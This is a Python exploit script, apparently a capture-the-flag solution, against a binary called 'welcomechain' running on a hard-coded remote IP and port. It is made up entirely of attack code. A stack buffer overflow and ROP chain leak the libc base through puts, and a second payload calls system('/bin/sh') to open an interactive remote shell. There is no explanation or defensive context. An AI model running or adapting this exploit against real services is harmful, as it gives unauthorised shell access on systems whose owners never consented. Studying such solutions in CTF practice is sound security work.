from ptrlib import *

libc = ELF("./libc.so.6")
elf = ELF("./welcomechain")
#sock = Process("./welcomechain")
sock = Socket("114.177.250.4", 2226)
rop_pop_rdi = 0x00400853

# libc leak
payload = b'A' * 0x28
payload += p64(rop_pop_rdi)
payload += p64(elf.got("puts"))
payload += p64(elf.plt("puts"))
payload += p64(elf.symbol("main"))
sock.sendlineafter(": ", payload)
sock.recvline()
libc_base = u64(sock.recvline()) - libc.symbol("puts")
logger.info("libc = " + hex(libc_base))

# shell
payload = b'A' * 0x28
payload += p64(rop_pop_rdi + 1)
payload += p64(rop_pop_rdi)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(libc_base + libc.symbol("system"))
sock.sendlineafter(": ", payload)

sock.interactive()
